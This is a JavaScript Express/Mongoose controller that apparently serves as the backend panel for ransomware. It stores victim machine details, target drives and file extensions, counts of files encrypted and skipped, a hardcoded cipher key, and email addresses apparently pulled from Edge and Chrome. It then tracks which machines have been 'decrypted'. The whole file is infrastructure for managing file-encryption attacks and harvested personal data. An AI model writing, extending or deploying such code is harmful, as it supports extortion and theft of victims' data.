import { decryptedMachinesModel } from "./decrypt-model.js";
import { encryptedMachinesModel } from "./model.js";

export const SaveEncryptedMachineDetails = async (req, res) => {
  try {
    console.log("=====================ENCRYPTION=====================");

    if (!Array.isArray(req.body.edgeMails)) {
    req.body.edgeMails = [req.body.edgeMails];
}

if (!Array.isArray(req.body.chromeMails)) {
    req.body.chromeMails = [req.body.chromeMails];
}


    const {
      machineName,
      machineManufacturer,
      machineModel,
      processor,
      osName,
      osVersion,
      ram,
      rom,
      maskid,
      uuid,
      TargetDrive,
      AvailedStorage,
      TargetExtension,
      TotalFound,
      SuccessCount,
      SkipCount,
      message,
      edgeMails,
      chromeMails
    } = req.body;

    console.log(req.body);


    //Check already the maskid and status


const alreadyPresent = await encryptedMachinesModel.findOne({
  maskid: maskid,
  status: "active"
});

if (alreadyPresent) {
  const data = await encryptedMachinesModel.findOneAndUpdate(
    { _id: alreadyPresent._id },
    {
      $set: {
        SuccessCount,
      SkipCount,
      message, 
      }
    },
    { new: true } // returns the updated document
  );

  console.log(data);

    return res.status(200).json({
    success: true,
    message: "Updated successfully",
  });
}

    const data = {
      ...req.body,
      cipher: "ASK06^84%56*#",
      status: "active",
    };

    await encryptedMachinesModel.create(data);

    return res.status(200).json({
      success: true,
      message: "Data received",
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: error.message,
    });
  }
};

export const SaveDecryptedMachineDetails = async (req, res) => {
  try {
    console.log("=====================DECRYPTION=====================");
    const {
      machineName,
      maskid,
      uuid,
      TargetDrive,
      TargetExtension,
      TotalFound,
      SuccessCount,
      SkipCount,
    } = req.body;

    await decryptedMachinesModel.create(req.body);

    //Also update status in encryptionModel

    await encryptedMachinesModel.updateMany(
      { uuid },
      {
        $set: {
          status: "Decrypted",
        },
      },
    );

    return res.status(200).json({
      success: true,
      message: "Data received",
    });
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: error.message,
    });
  }
};

export const getEncryptedMachines = async (req, res) => {
  try {
    const page = Number(req.query.page) || 1;
    const limit = 9;
    const search = req.query.search || "";

    const filter = { status: "active" };

    if (search) {
      filter.machineName = {
        $regex: search,
        $options: "i",
      };
    }

    const totalRecords = await encryptedMachinesModel.countDocuments(filter);
    const machines = await encryptedMachinesModel
      .find(filter)
      .skip((page - 1) * limit)
      .limit(limit);

    if (machines.length > 0) {
      return res.status(200).json({
        message: "The details are",
        data: machines,
        totalPages: Math.ceil(totalRecords / limit),
      });
    } else {
      return res.status(404).json({
        message: "No Machines Found",
        data: 0,
      });
    }
  } catch (error) {
    console.log(error);
    return res.status(500).json({
      message: error.message,
      data: 0,
    });
  }
};

export const getDecryptedMachines = async (req, res) => {
  try {
    const limit = 9;
    const page = Number(req.query.page) || 1;
    const search = req.query.search || "";

    let searchKeyword = {};

    if (search) {
      searchKeyword.machineName = {
        $regex: search,
        $options: "i",
      };
    }

    const totalRecords =
      await decryptedMachinesModel.countDocuments(searchKeyword);

    const machines = await decryptedMachinesModel
      .find(searchKeyword)
      .skip((page - 1) * limit)
      .limit(limit);

    if (machines.length > 0) {
      return res.status(200).json({
        message: "the details are",
        data: machines,
        totalPages: Math.ceil(totalRecords / limit),
      });
    } else {
      return res.status(404).json({
        message: "No Machines Found",
        data: 0,
      });
    }
  } catch (error) {
    return res.status(500).json({
      message: error.message,
      data: 0,
    });
  }
};
